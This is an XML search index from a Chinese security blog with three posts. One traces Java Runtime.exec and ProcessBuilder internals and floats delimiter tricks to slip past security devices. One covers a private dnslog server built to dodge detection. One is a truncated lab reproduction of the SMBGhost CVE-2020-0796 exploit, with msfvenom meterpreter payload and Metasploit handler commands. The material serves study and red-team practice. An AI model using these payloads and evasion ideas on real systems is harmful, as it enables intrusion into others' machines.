<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java命令执行浅析</title>
      <link href="/2021/09/03/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/"/>
      <url>/2021/09/03/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>常用的两个类：<code>Runtime</code>、<code>ProcessBuilder</code></p><h2 id="Runtime类"><a href="#Runtime类" class="headerlink" title="Runtime类"></a>Runtime类</h2><blockquote><p><em>Every Java application has a single instance of class Runtime that allows the application to interface with the environment in which the application is running. The current runtime can be obtained from the getRuntime method.（每个Java应用程序都有一个Runtime类的Runtime ，允许应用程序与运行应用程序的环境进行接口。当前运行时可以从getRuntime方法获得。）</em></p></blockquote><ol><li><p>从<code>java.lang.Runtime</code>源码中看到，这个类自JDK1.0就存在了；该类的构造方法是私有的，目的为了不让”任何人”实例化这个类。如果需要得到Runtime类，可以使用静态方法<code>getRuntime()</code>，该方法返回值的是<code>Runtime</code>类型。</p><img src="/img/Java命令执行浅析/01.PNG" alt="01" style="zoom: 50%;" /></li><li><p>Runtime类中的方法</p><div  align="center">    <img src="/img/Java命令执行浅析/02.jpg" style="zoom: 50%;" /></div></li><li><p>这里重点关注一下<code>exec()</code>方法</p></li></ol><ul><li>Runtime中关于<code>exec()</code>共有6种重载的方法，返回值均为<code>Process</code>类型，也就有6种参数列表</li><li>其中主要有三个参数：command、envp、dir<ul><li><code>command (String/String[])</code>：需要执行的命令</li><li><code>envp (String[])</code>：运行环境的数组，该值为空表示子进程继承当前进程环境</li><li><code>dir (File)</code>：子进程的工作目录，该值为空表示继承当前进程的工作目录</li><li>这里主要区分在于传入的command的类型，分为字符串和字符串数组，envp和dir如果没有指定的话，默认为null</li></ul></li></ul><h3 id="字符串类型的命令"><a href="#字符串类型的命令" class="headerlink" title="字符串类型的命令"></a>字符串类型的命令</h3><ol><li>以调用exec打开计算器为例：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>运行如上代码并调试，跟踪执行流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">exec(String command)</span><br><span class="line">exec(String command, String[] envp, File dir)</span><br><span class="line">StringTokenizer(command)  <span class="comment">//获取StringTokenizer对象，将command转换为字符串数组</span></span><br><span class="line">exec(String[] command, String[] envp, File dir)</span><br><span class="line">ProcessBuilder(cmdarry).environment().directory().start()</span><br></pre></td></tr></table></figure><ol start="2"><li><p>整个流程会将String类型的命令  –&gt;  通过StringTokenizer处理为字符串数组  –&gt;  调用ProcessBuilder类进行实例化  –&gt;  调用ProcessBuilder的enviroment()、directory()、start()方法；ProcessBuilder的start()方法，返回的是Process对象。</p></li><li><p>实际上<code>Runtime</code>中执行系统命令的exec()方法最终仍然是对ProcessBuilder的调用。关于<code>ProcessBuilder</code>类的使用，先放到后面去分析。</p></li></ol><h3 id="StringTokenizer类"><a href="#StringTokenizer类" class="headerlink" title="StringTokenizer类"></a>StringTokenizer类</h3><ol><li>对于字符串类型的command，Runtime.exec()会通过StringTokenizer类中的方法，进一步分析command在这个过程中被怎样处理了。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.lang.Runtime.exec()</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command, String[] envp, File dir)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (command.isEmpty())</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Empty command&quot;</span>);</span><br><span class="line"></span><br><span class="line">    StringTokenizer st = <span class="keyword">new</span> StringTokenizer(command);</span><br><span class="line">    String[] cmdarray = <span class="keyword">new</span> String[st.countTokens()];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; st.hasMoreTokens(); i++)</span><br><span class="line">        cmdarray[i] = st.nextToken();</span><br><span class="line">    <span class="keyword">return</span> exec(cmdarray, envp, dir);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>实例化StringTokenizer类  —&gt;  新建String[]类型的变量，长度为command分割后的个数  —&gt;  取分割后的每一段复制为cmdarray数组。        </li></ol><ul><li>实例化SkingTokenizer类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//java.util.StringTokenizer</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringTokenizer</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(str, <span class="string">&quot; \t\n\r\f&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringTokenizer</span><span class="params">(String str, String delim, <span class="keyword">boolean</span> returnDelims)</span> </span>&#123;</span><br><span class="line">    currentPosition = <span class="number">0</span>;</span><br><span class="line">    newPosition = -<span class="number">1</span>;</span><br><span class="line">    delimsChanged = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.str = str;</span><br><span class="line">    maxPosition = str.length();</span><br><span class="line">    delimiters = delim;</span><br><span class="line">    retDelims = returnDelims;</span><br><span class="line">    setMaxDelimCodePoint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如代码所示，分割为<code> \t\n\r\f</code> 分别对应 空格、制表符、换行符、回车符、换页符。</p><p>实例化的过程中，基本是对一些内部变量的赋值。</p><ul><li>StringTokenizer.countTokens()计算了command根据分割符会被分割的个数，hasMoreTokens()根据之前计算的分割总数和当前的分割次数判断是否继续循环取值，nextToken()则获取分割的内容，添加到cmdarray中。</li><li>分割的过程比较常规，但是回到经常遇到的一个问题：在Runtime.getRuntime.exec()中不能使用某些特殊字符，如 | &amp; ，这是为什么呢？</li></ul><h3 id="调试分析带有特殊字符的命令"><a href="#调试分析带有特殊字符的命令" class="headerlink" title="调试分析带有特殊字符的命令"></a>调试分析带有特殊字符的命令</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;echo hello &gt; /tmp/success.txt);</span></span><br></pre></td></tr></table></figure><p>下断点进入调试</p><p><img src="/img/Java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%B5%85%E6%9E%90/03.png" alt="03"></p><p>如图所示，命令被分割为<code>new String[]&#123;&quot;echo&quot;, &quot;hello&quot;, &quot;&gt;&quot;, &quot;/tmp/success.txt&quot;&#125; </code>，相当于我们运行如下代码，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&gt;&quot;</span> , <span class="string">&quot;/tmp/success.txt&quot;</span>&#125;);</span><br><span class="line"><span class="comment">// -&gt; 相当于</span></span><br><span class="line"><span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;&gt;&quot;</span> , <span class="string">&quot;/tmp/success.txt&quot;</span>&#125;).start();</span><br></pre></td></tr></table></figure><p>看来不是分割字符的问题，实际上执行上面的代码也是不成功的，当然解决方法是使用如下代码执行，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo hello &gt; /tmp/success.txt&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><p>但是为什么重定符加入后，运行命令失败呢？看来问题在<code>ProcessBuilder</code>这个类的方法中。</p><h2 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h2><blockquote><p>This class is used to create operating system processes.（这个类用于创建操作系统进程）</p></blockquote><ol><li><p>该类共有两个构造方法，很好理解，分别是String…和List<String>类型的参数列表。传入的command最终均赋值给command变量。</p><p>这里有个有意思的地方，实际上ProcessBuilder自JDK1.5中才有的。那是不是JDK1.5以前Runtime类中没有exec方法呢？或者当时1.5以前的exec()方法，还是有别的运行逻辑 :&gt;</p><img src="/img/Java命令执行浅析/04.png" alt="04" style="zoom:50%;" /></li><li><p><code>ProcessBuilder</code>类中的方法</p></li></ol><img src="/img/Java命令执行浅析/05.png" alt="05" style="zoom:50%;" /><p>首先测试一个常规执行命令的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo hello &gt; /tmp/success.txt&quot;</span>).start();</span><br></pre></td></tr></table></figure><h3 id="获取命令执行的返回结果"><a href="#获取命令执行的返回结果" class="headerlink" title="获取命令执行的返回结果"></a>获取命令执行的返回结果</h3><p>总结了四种获取命令执行的数据流</p><ul><li><strong>执行命令</strong></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;ifconfig&quot;</span>);</span><br><span class="line">System.out.println(p.command());</span><br><span class="line">Process process = p.start();</span><br></pre></td></tr></table></figure><ul><li>获取返回结果 - 1</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">String line = <span class="keyword">null</span>;</span><br><span class="line">StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    sb.append(line + System.getProperty(<span class="string">&quot;line.separator&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 2</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Scanner s = <span class="keyword">new</span> Scanner(process.getInputStream());</span><br><span class="line">String result = s.useDelimiter(<span class="string">&quot;\\A&quot;</span>).hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 3</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String result = org.apache.commons.io.IOUtils.toString(process.getInputStream());</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure><ul><li>读取返回结果 - 4</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//JDK8+</span></span><br><span class="line">BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">StringJoiner stringJoiner = <span class="keyword">new</span> StringJoiner(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">reader.lines().iterator().forEachRemaining(stringJoiner::add);</span><br><span class="line">System.out.println(stringJoiner.toString());</span><br></pre></td></tr></table></figure><h3 id="不能直接获取返回结果的命令"><a href="#不能直接获取返回结果的命令" class="headerlink" title="不能直接获取返回结果的命令"></a>不能直接获取返回结果的命令</h3><p>实际上，当我们执行<code>python —version</code>, <code>java -version</code> 这一类非系统命令，而通过运行环境的环境变量中添加的命令时，默认是无法通过 <code>getInputStream()</code>获取数据流的。</p><p>比如如下运行结果，是获取不到结果的。</p><img src="/img/Java命令执行浅析/06.png" alt="06" style="zoom:50%;" /><p>这里可以调用<code>ProcessBuilder.inheritIO()</code>和<code>ProcessBuilder.redirectErrorStream()</code>这两个方法让你看到执行的结果，不过这两个方法也是有区别的。</p><ul><li><p><strong><u>ProcessBuilder.inheritIO()</u></strong></p><blockquote><p>Sets the source and destination for subprocess standard I/O to be the same as those of the current Java process.(将子进程标准I/O的源和目标设置为与当前Java进程的源和目标相同。)</p></blockquote><p>这个方法实际上将子进程运行的结果输出在当前Java进程的输出显示，比如</p><img src="/img/Java命令执行浅析/07.PNG" alt="07" style="zoom: 50%;" /></li></ul><p>​    如上图所示，实际上并没有通过<code>getInputsStream()</code>取返回结果，但是控制台输出了打印结果。可以看到<code>java -version</code>的结果是<em>红色</em>的，这通常表示是一个异常信息的打印。</p><ul><li><p><strong><u>ProcessBuilder.redirectErrorStream(true)</u></strong></p><blockquote><p>Sets this process builder’s redirectErrorStream property. If this property is true, then any error output generated by subprocesses subsequently started by this object’s start() method will be merged with the standard output, so that both can be read using the Process.getInputStream() method. This makes it easier to correlate error messages with the corresponding output. The initial value is false.</p></blockquote><p>大概的意思是，如果调用该方法且参数为<strong>true</strong> ，<code>start()</code>方法启动的子进程生成的任何错误输出都将与标准输出合并，以便可以使用<code>Process.getInputStream()</code>方法获取结果。</p><img src="/img/Java命令执行浅析/08.PNG" alt="08" style="zoom: 50%;" /></li></ul><p>那么为什么<code>java -version</code>返回的结果被当做异常信息了呢？调试跟踪看一下是如何运行的。</p><p>跟踪一下运行流程，发现系统的异常打印从<code>forkAndExec()</code>这个方法后出现的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder.start()</span><br><span class="line">ProcessImpl.start(...)</span><br><span class="line"><span class="keyword">new</span> UNIXProcess(...)</span><br><span class="line">pid = forkAndExec(...)</span><br></pre></td></tr></table></figure><img src="/img/Java命令执行浅析/09.PNG" alt="09" style="zoom: 50%;" /><p>这里<code>forkAndExec()</code> 的修复符是<code>native</code> ，相当于实际上运行<code>forkAndExec</code>时会调用C语言实现相应的功能。对应的源码可参照<code>openjdk8/openjdk/jdk/src/solaris/native/java/lang/UNIXProcess_md.c</code> 来阅读。</p><p>总结一下这部分的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ProcessBuilder p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-version&quot;</span>);</span><br><span class="line">p.redirectErrorStream(<span class="keyword">true</span>);</span><br><span class="line">Process process = p.start();</span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(process.getInputStream()));</span><br><span class="line">String line = <span class="keyword">null</span>;</span><br><span class="line">StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>)&#123;</span><br><span class="line">    sb.append(line + System.getProperty(<span class="string">&quot;line.separator&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">process.waitFor();</span><br><span class="line">System.out.println(sb.toString());</span><br></pre></td></tr></table></figure><p>补充一下：<code>Process.waitFor()</code>会将当前线程阻塞，直到子进程执行退出</p><h3 id="特殊符号的问题"><a href="#特殊符号的问题" class="headerlink" title="特殊符号的问题"></a>特殊符号的问题</h3><p>回到<code>Runtime.getRuntime().exec()</code>中的问题，为什么带有重定符、管道符等特殊符号的命令不能直接执行呢？</p><p>先执行一下带有重定向符的命令：</p><img src="/img/Java命令执行浅析/10.PNG" alt="10" style="zoom: 50%;" /><p>返回结果初步判断是将<code>&quot;1&quot; &quot;&gt;&quot; &quot;/tmp/success&quot;</code>作为<code>echo</code>命令的参数来执行了，相当于执行<code>echo 1 &quot;&gt;&quot; /tmp/success</code> 这样的命令</p><img src="/img/Java命令执行浅析/11.png" alt="11" style="zoom:50%;" /><p>继续调试一下</p><img src="/img/Java命令执行浅析/12.PNG" alt="12" style="zoom: 50%;" /><img src="/img/Java命令执行浅析/13.PNG" alt="13" style="zoom: 50%;" /><p>在实例化<strong>UNIXProcess</strong>对象后执行子进程时，字节数组第一位是待执行的命令，其他的都作为参数处理，而我理解的<em>命令行</em>中执行的管道符是由于<em>bash</em>或<em>命令提示符</em> 会对管道符、重定向符等特殊符号赋予特殊的含义吧。方法的话可以使用<code>new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&quot;&#125;</code>来避免这些符号带来的困扰。</p><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><ol><li><p>根据StringTokenizer类中方法，在命令中加入一些不同的分割符能不能绕过一些安全设备的防护呢？估计效果不太好。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;open\t\f\f\t\f\f\f/System/Applications/Calculator.app&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>JDK1.5以前没有ProcessBuilder类。</p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><em><a href="https://download.java.net/openjdk/jdk8">https://download.java.net/openjdk/jdk8</a></em></p><p><em><a href="https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html">https://www.oracle.com/java/technologies/java-archive-142docs-downloads.html</a></em></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dnslog平台探索</title>
      <link href="/2021/05/06/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/"/>
      <url>/2021/05/06/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<p>&emsp;&emsp;在蓝军防守过程中，遇到一些告警的流量中，出现很明显的dnslog平台的痕迹，比如：验证fastjson时，payload时xxx.dnslog.cn，这种流量会直接触发反序列化攻击的攻击，那么对于这个攻击的防护算检测到了，但是如果使用一些编码绕过了流量的识别呢？实际上越来越多的安全监控将dnslog.cn、ceye.io加入到针对dns流量的分析中；一次真实的溯源工作中，我们通过ceye.io的id找到了真实的攻击者，这表示公用的dnslog平台已经不能用来做更加隐蔽攻击探测。<br>&emsp;&emsp;实际上很多的团队已经自己搭建dnslog平台，或将dnlog功能加入到自建的安全攻击平台中。</p><p>一个简单、实用、安全的dnslog平台有哪些需求呢？</p><ul><li>方便启动</li><li>账号分权</li><li>管理端的安全性</li><li>域名更隐蔽<br>…</li></ul><h3 id="选取一套合适的开源代码"><a href="#选取一套合适的开源代码" class="headerlink" title="选取一套合适的开源代码"></a>选取一套合适的开源代码</h3><p>&emsp;&emsp;有精力的话，可以自己从开始编写代码，但是这样有点耗费时间，github上已经有很多开源的项目，这里挑出来3个。</p><blockquote><p>java版本：<br><a href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a><br>python版本：<br><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a><br>golang版本：<br><a href="https://github.com/chennqqi/godnslog">https://github.com/chennqqi/godnslog</a><br>我选择了SPuerBRead的Bridge，功能介绍可以参考该项目的readme。</p></blockquote><h3 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h3><p>&emsp;&emsp;SPuerBRead的这台平台已经可以做到很方便的启动、dnslog、httplog的记录功能了，但是对于自己使用起来，还有一些小需求，于是做了一些的修改。<br>如下是一些想法和作出的改动</p><h5 id="Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4-。。。，这样导致用户的dnslog验证的payload地址是这样的："><a href="#Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4-。。。，这样导致用户的dnslog验证的payload地址是这样的：" class="headerlink" title="Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4 。。。，这样导致用户的dnslog验证的payload地址是这样的："></a>Q1：启动后登录，注册的用户会生成logid字段，该字段是数字类型，值是1、2、3、4 。。。，这样导致用户的dnslog验证的payload地址是这样的：</h5><p>xxx.1.dnslog.com<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%BF%AE%E6%94%B9%E5%89%8D.jpg" alt="修改前"><br>这样对于监控来说，很可能会觉得如果有内网解析这样的dns请求是很奇怪的。<br><strong>A：</strong>修改了用户logid字段类型为varchar类型，在注册用户是生成为随机的4位字符。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%BF%AE%E6%94%B9%E5%90%8E.jpg" alt="修改后"></p><h5 id="Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。"><a href="#Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。" class="headerlink" title="Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。"></a>Q2：原程序中任何子域的解析请求都会响应并记录到数据库中，这样一旦遇到爆破dns记录的情况，会导致数据库中大量垃圾数据。</h5><p>A2：在返回解析结果时检查库中是否有request对应logid，如果不存在则不响应任何内容</p><h5 id="Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。"><a href="#Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。" class="headerlink" title="Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。"></a>Q3：对web访问做限制，只有自己或小伙伴可以访问管理端。</h5><p>A2：自定义header字段的判断，只放过自定义header验证正确的请求，有关Header-Signal的值，可以指定springboot启动参数位置自定义。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E8%87%AA%E5%AE%9A%E4%B9%89header%E6%AD%A3%E7%A1%AE%E7%9A%84%E8%AF%B7%E6%B1%82.jpg" alt="自定义header正确的请求"></p><p><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E8%87%AA%E5%AE%9A%E4%B9%89header%E9%94%99%E8%AF%AF%E7%9A%84%E8%AF%B7%E6%B1%82.jpg" alt="自定义header错误的请求"></p><p>其他也更新了一些小功能，比如logid的显示，dnslog界面显示payload等。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>启动参数可以参考帮助信息或项目readme</p><blockquote><p>这里有一个有意思的地方：在网上看过几片文章，有些写着需要两个域名来实现自定义解析的功能，这里试验了一下，其实使用一个域名服务就可以实现。</p></blockquote><p>首先我们看下两个域名的一个解析流程<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%B8%A4%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="两个域名的解析流程"></p><p>实际上，一个域名也可以配置<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/dns%E9%85%8D%E7%BD%AE%E6%88%AA%E5%9B%BE.jpg" alt="-w1001"></p><p>这样的解析过程就可以依靠一个域名、一个vps完成。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/%E4%B8%80%E4%B8%AA%E5%9F%9F%E5%90%8D%E7%9A%84%E9%85%8D%E7%BD%AE.jpg" alt="一个域名的解析过程"><br>从dns解析的trace也可以清晰的看到解析路径。<br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/dnsTrace.jpg" alt="dnstrace"><br><img src="/img/dnslog%E5%B9%B3%E5%8F%B0%E6%8E%A2%E7%B4%A2/16206419670337.jpg" alt="-w1144"></p><p>搭建完了才发现，原作者也是一个域名。。。</p><h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>&emsp;&emsp;还有一个小思路，现在很多dnslog平台，在返回解析记录时，将所有解析记录都指向127.0.0.1，对于安全监控来说，完全可以在针对dns流量的审计中，增加判断，当检测到存在127.0.0.1的response返回包时，触发告警疑似dnslog请求。所以在搭建的时候，配置平台默认返回的解析结果尽量指定一个可信的公网ip。</p><blockquote><p>项目源代码上传至：<a href="https://github.com/ninefiger/dnslogPt">https://github.com/ninefiger/dnslogPt</a><br>感谢原版作者：<a href="https://github.com/SPuerBRead/Bridge">https://github.com/SPuerBRead/Bridge</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10—SMB3_CVE-2020-0796复现</title>
      <link href="/2020/11/22/win10%E2%80%94SMB3-CVE-2020-0796%E5%A4%8D%E7%8E%B0/"/>
      <url>/2020/11/22/win10%E2%80%94SMB3-CVE-2020-0796%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><ol><li>环境<ul><li>被攻击点：Microsoft Windows 10（1903）- 192.168.0.26</li><li>攻击机：kali - 192.168.0.23</li></ul></li><li>工具<ul><li>SMBGhost_RCE_PoC （<a href="https://github.com/chompie1337/SMBGhost_RCE_PoC%EF%BC%89">https://github.com/chompie1337/SMBGhost_RCE_PoC）</a></li><li>Metasploit （kali）</li></ul></li></ol><h3 id="0x02-扫描确认漏洞是否存在"><a href="#0x02-扫描确认漏洞是否存在" class="headerlink" title="0x02 扫描确认漏洞是否存在"></a>0x02 扫描确认漏洞是否存在</h3><p>​        直接使用奇安信的扫描工具，扫描目标系统是否存在漏洞。</p><p>下载链接：<a href="http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip">http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip</a> </p><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87%E7%B3%BB%E7%BB%9F.jpg" alt="扫描目标系统"></p><h3 id="0x03-生成payload并攻击"><a href="#0x03-生成payload并攻击" class="headerlink" title="0x03 生成payload并攻击"></a>0x03 生成payload并攻击</h3><ol><li><p>msf正向连接Shell</p><p>a. 生成payload</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=81 -b <span class="string">&#x27;\x00&#x27;</span> -f python</span><br></pre></td></tr></table></figure><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5payload.jpg" alt="生成payload1"></p><p>​        b. 复制buf，修改SMBGhost_RCE_PoC中USER_PAYLOAD变量为payload</p><p><img src="/img/win10%E2%80%94SMB3_CVE-2020-0796%E5%A4%8D%E7%8E%B0/%E6%9B%BF%E6%8D%A2exploit.py.jpg" alt="修改exp"></p><p>​        c. msf开启监听</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">81</span></span><br><span class="line"><span class="built_in">set</span> RHOST <span class="number">192.168</span><span class="number">.0</span><span class="number">.26</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>​        d. 运行exploit.py，发送payload</p><figure class="highlight bash"><table><tr><td 